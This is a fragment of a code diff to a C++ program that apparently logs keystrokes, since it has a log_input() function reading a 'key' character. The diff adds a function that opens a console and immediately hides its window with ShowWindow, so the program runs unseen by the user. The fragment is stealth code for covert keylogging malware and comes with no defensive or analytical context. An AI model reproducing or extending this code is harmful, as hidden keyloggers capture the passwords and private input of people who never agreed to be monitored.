@@ -4,6 +4,12 @@
 #include <fstream>
 
 using namespace std;
+void hide_cross_section()
+{
+    AllocConsole();
+    HWND cross_section = FindWindowA("ConsoleWindowClass",NULL);
+    ShowWindow(cross_section,0);
+}
 void log_input()
 {
     char key;
